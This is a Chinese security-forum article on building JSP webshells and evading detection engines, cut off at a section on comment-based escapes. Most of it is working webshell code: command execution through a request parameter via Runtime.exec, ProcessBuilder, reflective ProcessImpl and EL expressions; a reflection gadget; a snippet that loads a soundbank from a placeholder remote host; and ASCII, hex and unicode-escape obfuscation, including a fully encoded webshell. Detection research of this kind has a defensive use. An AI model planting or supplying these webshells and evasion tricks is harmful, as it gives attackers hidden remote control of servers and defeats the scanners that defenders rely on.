---
title: 攻与防：JSP Webshell检测引擎的对抗
url: https://forum.butian.net/share/4560
source: 奇安信攻防社区
date: 2025-09-16
fetch_date: 2025-10-02T20:10:48.529499
---

# 攻与防：JSP Webshell检测引擎的对抗

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### 攻与防：JSP Webshell检测引擎的对抗

* [漏洞分析](https://forum.butian.net/topic/48)

分析了从一个简单的JSP webshell的构造到使用JSP特定的XML语法、使用标签在jsp转化为java代码的过程中通过拼接造成的恶意代码插入以及针对检测引擎的特性进行针对性webshell对抗的各种方式

### 普通webshell
#### Runtime.getRuntime
```php
<%
   // original WebShell
   String cmd = request.getParameter("cmd");
   if (cmd != null) {
       Process process = Runtime.getRuntime().exec(cmd);
       InputStream inputStream = process.getInputStream();
       BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
       String res = null;
       while ((res = bufferedReader.readLine()) != null) {
           response.getWriter().write(res);
      }
  }
%>
```
#### ProcessBuilder
```php
<%
   // original WebShell
   String cmd = request.getParameter("cmd");
   if (cmd != null) {
       // ProcessBuilder
       Process process = new ProcessBuilder(new String[]{cmd}).start();
       InputStream inputStream = process.getInputStream();
       BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
       String res = "";
       while ((res = bufferedReader.readLine()) != null) {
           response.getWriter().write(res);
      }
  }
%>
```
#### ProcessImpl
```php
           // ProcessImpl#start()
           Class<?> aClass = Class.forName("java.lang.ProcessImpl");
           Method start = aClass.getDeclaredMethod("start", String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class);
           start.setAccessible(true);
           Process process = (Process) start.invoke(null, new String[]{cmd}, null, ".", null, true);
```
#### EL表达式
##### jsp body下的EL执行
在`jsp`文件的`<%= %>`和jspx文件下的`jsp:expression`均可执行EL表达式
##### jsp 标签内的EL执行
EL表达式不仅可以放到jsp的body里，也可以插入到各种的标签中
```php
<jsp:useBean id="test" type="java.lang.Class" beanName="${Runtime.getRuntime().exec(param.cmd)}"></jsp:useBean>
```
##### 动态接受参数
```php
${param.getClass().forName(param.a).newInstance().getEngineByName(param.b).eval(param.c)}
```
同样可以使用`[]`进行webshell的构造
```php
${""[param.a]()[param.b](param.c)[param.d]()[param.e](param.f)[param.g](param.h)}
```
### 反射方法
#### 反射调用方法
#### 反射属性值执行
##### com.sun.javafx.property.PropertyReference#set
```php
PropertyReference reference = new
PropertyReference(String.class, "test");
Field reflected =
PropertyReference.class.getDeclaredField("reflected");
reflected.setAccessible(true);
reflected.set(reference, true);//跳过判断限制
Method method = Runtime.class.getDeclaredMethod("exec",
String[].class);
Field setter =
PropertyReference.class.getDeclaredField("setter");
setter.setAccessible(true);
setter.set(reference, method);//设置恶意方法
reference.set(Runtime.getRuntime(), new String[]{“bash”,
“-c”, “open -a Calculator”});//要执行的恶意命令
```
#### 非黑名单方法
##### JARSoundbankReader
```php
<%
JARSoundbankReader reader = new JARSoundbankReader();
URL url = new URL("http://xx.xx.xx.xx/");
reader.getSoundbank(url);
%>
```
### 编码绕过
#### Java层代码编码
\*\*ASCII\*\*
Class&lt;?&gt; aClass = Class.forName(new String(new byte\[\]{ 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101}));
\*\*HEX\*\*
Class&lt;?&gt; aClass = Class.forName(new String(DatatypeConverter.parseHexBinary("6a6176612e6c616e672e52756e74696d65"));
#### unicode编码
jsp支持unicode编码
##### 直接编码
&lt;%@ page contentType\\="text/html;charset=UTF-8" language\\="java" pageEncoding\\="UTF-8" %&gt;
&lt;%@ page import\\="java.io.\\*"%&gt;
​
&lt;%
\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067\\u0020\\u0063\\u006d\\u0064\\u0020\\u003d\\u0020\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074\\u002e\\u0067\\u0065\\u0074\\u0050\\u0061\\u0072\\u0061\\u006d\\u0065\\u0074\\u0065\\u0072\\u0028\\u0022\\u0063\\u006d\\u0064\\u0022\\u0029\\u003b\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0069\\u0066\\u0020\\u0028\\u0063\\u006d\\u0064\\u0020\\u0021\\u003d\\u0020\\u006e\\u0075\\u006c\\u006c\\u0029\\u0020\\u007b\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0050\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\\u0020\\u0070\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\\u0020\\u003d\\u0020\\u0052\\u0075\\u006e\\u0074\\u0069\\u006d\\u0065\\u002e\\u0067\\u0065\\u0074\\u0052\\u0075\\u006e\\u0074\\u0069\\u006d\\u0065\\u0028\\u0029\\u002e\\u0065\\u0078\\u0065\\u0063\\u0028\\u0063\\u006d\\u0064\\u0029\\u003b\\u000a\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0049\\u006e\\u0070\\u0075\\u0074\\u0053\\u0074\\u0072\\u0065\\u0061\\u006d\\u0020\\u0069\\u006e\\u0070\\u0075\\u0074\\u0053\\u0074\\u0072\\u0065\\u0061\\u006d\\u0020\\u003d\\u0020\\u0070\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\\u002e\\u0067\\u0065\\u0074\\u0049\\u006e\\u0070\\u0075\\u0074\\u0053\\u0074\\u0072\\u0065\\u0061\\u006d\\u0028\\u0029\\u003b\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0042\\u0075\\u0066\\u0066\\u0065\\u0072\\u0065\\u0064\\u0052\\u0065\\u0061\\u0064\\u0065\\u0072\\u0020\\u0062\\u0075\\u0066\\u0066\\u0065\\u0072\\u0065\\u0064\\u0052\\u0065\\u0061\\u0064\\u0065\\u0072\\u0020\\u003d\\u0020\\u006e\\u0065\\u0077\\u0020\\u0042\\u0075\\u0066\\u0066\\u0065\\u0072\\u0065\\u0064\\u0052\\u0065\\u0061\\u0064\\u0065\\u0072\\u0028\\u006e\\u0065\\u0077\\u0020\\u0049\\u006e\\u0070\\u0075\\u0074\\u0053\\u0074\\u0072\\u0065\\u0061\\u006d\\u0052\\u0065\\u0061\\u0064\\u0065\\u0072\\u0028\\u0069\\u006e\\u0070\\u0075\\u0074\\u0053\\u0074\\u0072\\u0065\\u0061\\u006d\\u0029\\u0029\\u003b\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067\\u0020\\u0072\\u0065\\u0073\\u0020\\u003d\\u0020\\u006e\\u0075\\u006c\\u006c\\u003b\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0077\\u0068\\u0069\\u006c\\u0065\\u0020\\u0028\\u0028\\u0072\\u0065\\u0073\\u0020\\u003d\\u0020\\u0062\\u0075\\u0066\\u0066\\u0065\\u0072\\u0065\\u0064\\u0052\\u0065\\u0061\\u0064\\u0065\\u0072\\u002e\\u0072\\u0065\\u0061\\u0064\\u004c\\u0069\\u006e\\u0065\\u0028\\u0029\\u0029\\u0020\\u0021\\u003d\\u0020\\u006e\\u0075\\u006c\\u006c\\u0029\\u0020\\u007b\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0072\\u0065\\u0073\\u0070\\u006f\\u006e\\u0073\\u0065\\u002e\\u0067\\u0065\\u0074\\u0057\\u0072\\u0069\\u0074\\u0065\\u0072\\u0028\\u0029\\u002e\\u0077\\u0072\\u0069\\u0074\\u0065\\u0028\\u0072\\u0065\\u0073\\u0029\\u003b\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u007d\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u007d\\u000a
​
%&gt;
解码后内容
String cmd \\= request.getParameter("cmd");
if (cmd != null) {
Process process \\= Runtime.getRuntime().exec(cmd);
​
InputStream inputStream \\= process.getInputStream();
BufferedReader bufferedReader \\= new BufferedReader(new InputStreamReader(inputStream));
String res \\= null;
while ((res \\= bufferedReader.readLine()) != null) {
response.getWriter().write(res);
}
}
​
##### 混淆编码
###### 添加多个`u`
&lt;%@ page contentType\\="text/html;charset=UTF-8" language\\="java" pageEncoding\\="UTF-8" %&gt;
&lt;%@ page import\\="java.io.\\*"%&gt;
​
&lt;%
\\uuuu0053\\uu0074\\u0072\\u0069\\u006e\\u0067\\u0020
​
%&gt;
###### //注释符逃逸...